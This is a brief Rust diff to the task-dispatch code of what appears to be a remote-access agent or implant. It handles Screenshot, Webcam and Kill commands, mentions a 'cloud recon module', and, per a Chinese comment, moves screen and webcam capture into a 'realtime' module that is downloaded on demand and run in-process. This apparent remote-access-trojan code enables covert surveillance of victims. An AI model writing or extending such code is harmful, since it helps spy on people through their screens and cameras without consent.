@@ -195,12 +195,11 @@ async fn resolve_task(
             }
         }
         CommandType::Screenshot => {
-            let r = blocking_string(move || libra_modules::execution::ScreenCapture::capture("medium", None)).await;
-            TaskOutcome::DoneWrapped(r)
+            // 本体零 WS：截图由 realtime 模块提供（按需下载，进程内执行）
+            run("realtime".to_string(), serde_json::json!({ "action": "screenshot", "quality": "medium" })).await
         }
         CommandType::Webcam => {
-            let r = blocking_string(move || libra_modules::execution::CameraCapture::capture(0)).await;
-            TaskOutcome::DoneWrapped(r)
+            run("realtime".to_string(), serde_json::json!({ "action": "webcam", "index": 0 })).await
         }
         CommandType::Kill => {
             // Kill specific process by PID (cloud recon module)
